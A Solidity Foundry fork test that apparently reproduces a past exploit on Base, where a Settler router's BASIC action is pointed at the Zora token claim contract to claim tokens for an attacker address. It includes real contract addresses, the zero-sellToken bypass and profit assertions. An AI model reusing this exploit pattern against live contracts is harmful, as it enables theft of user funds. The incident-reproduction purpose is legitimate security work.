// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IZoraTokenCommunityClaim {
    function claim(address claimTo) external;
}

interface ISettler {
    struct AllowedSlippage {
        address recipient;
        address buyToken;
        uint256 minAmountOut;
    }

    function execute(AllowedSlippage calldata slippage, bytes[] calldata actions, bytes32 zidAndAffiliate)
        external
        payable
        returns (bool);
}

interface ISettlerActions {
    function BASIC(address sellToken, uint256 bps, address pool, uint256 offset, bytes calldata data) external;
}

contract ZoraComposabilityIncidentTest is Test {
    uint256 internal constant BASE_CHAIN_ID = 8453;
    uint256 internal constant FORK_BLOCK_BEFORE_ATTACK = 29_356_087;
    uint256 internal constant ATTACK_BLOCK = 29_356_088;

    bytes32 internal constant ATTACK_TX_HASH =
        0xf71a96fe83f4c182da0c3011a0541713e966a186a5157fd37ec825a9a99deda6;

    address internal constant ZORA_TOKEN = 0x1111111111166b7FE7bd91427724B487980aFc69;
    address internal constant CLAIM_CONTRACT = 0x0000000002ba96C69b95E32CAAB8fc38bAB8B3F8;
    address internal constant SETTLER = 0x5C9bdC801a600c006c388FC032dCb27355154cC9;
    address internal constant ATTACKER_EOA = 0xb957Ed2F9d104984FC547a26Da744CeF68A81238;
    address internal constant ATTACKER_RECEIVER = 0xb957Ed2F9d104984FC547a26Da744CeF68A81238;

    uint256 internal forkId;

    function setUp() public {
        string memory rpcUrl = vm.envOr("BASE_RPC_URL", string(""));
        if (bytes(rpcUrl).length == 0) {
            vm.skip(true, "set BASE_RPC_URL to run Base fork tests");
        }
        forkId = vm.createSelectFork(rpcUrl, FORK_BLOCK_BEFORE_ATTACK);
    }

    function testForkConfig() public view {
        assertEq(block.chainid, BASE_CHAIN_ID, "unexpected chain");
        assertEq(block.number, FORK_BLOCK_BEFORE_ATTACK, "unexpected fork block");
        assertEq(forkId, vm.activeFork(), "unexpected active fork");
    }

    function testPoC_DirectSettlerExecute_BasicActionClaimsZora() public {
        _logZoraBalances("before");

        uint256 beforeBal = IERC20(ZORA_TOKEN).balanceOf(ATTACKER_RECEIVER);
        uint256 beforeClaimPoolBal = IERC20(ZORA_TOKEN).balanceOf(CLAIM_CONTRACT);

        bytes memory claimCalldata = abi.encodeWithSelector(
            IZoraTokenCommunityClaim.claim.selector,
            ATTACKER_RECEIVER
        );
        bytes[] memory actions = new bytes[](1);
        actions[0] = abi.encodeWithSelector(
            ISettlerActions.BASIC.selector,
            address(0), // sellToken=0 bypasses amount patching
            uint256(0), // bps irrelevant for zero sellToken path
            CLAIM_CONTRACT,
            uint256(0), // required when sellToken==0
            claimCalldata
        );

        ISettler.AllowedSlippage memory slippage = ISettler.AllowedSlippage({
            recipient: ATTACKER_EOA,
            buyToken: address(0),
            minAmountOut: 0
        });

        vm.prank(ATTACKER_EOA);
        bool ok = ISettler(SETTLER).execute(slippage, actions, bytes32(0));
        assertTrue(ok, "settler execute failed");

        _logZoraBalances("after");

        uint256 afterBal = IERC20(ZORA_TOKEN).balanceOf(ATTACKER_RECEIVER);
        uint256 afterClaimPoolBal = IERC20(ZORA_TOKEN).balanceOf(CLAIM_CONTRACT);
        assertGt(afterBal, beforeBal, "attackerProfit must be > 0");
        assertLt(afterClaimPoolBal, beforeClaimPoolBal, "claim pool should lose funds");
        console2.log("profit (raw)", afterBal - beforeBal);
    }

    function testReferenceBlockNumber() public pure {
        assertEq(ATTACK_BLOCK, FORK_BLOCK_BEFORE_ATTACK + 1, "check incident boundary");
        assertEq(ATTACK_TX_HASH, bytes32(0xf71a96fe83f4c182da0c3011a0541713e966a186a5157fd37ec825a9a99deda6));
    }

    function _logZoraBalances(string memory tag) internal view {
        console2.log("== ZORA balances ==");
        console2.log("tag", tag);
        console2.log("attacker", IERC20(ZORA_TOKEN).balanceOf(ATTACKER_RECEIVER));
        console2.log("claimPool", IERC20(ZORA_TOKEN).balanceOf(CLAIM_CONTRACT));
        console2.log("settler", IERC20(ZORA_TOKEN).balanceOf(SETTLER));
    }
}
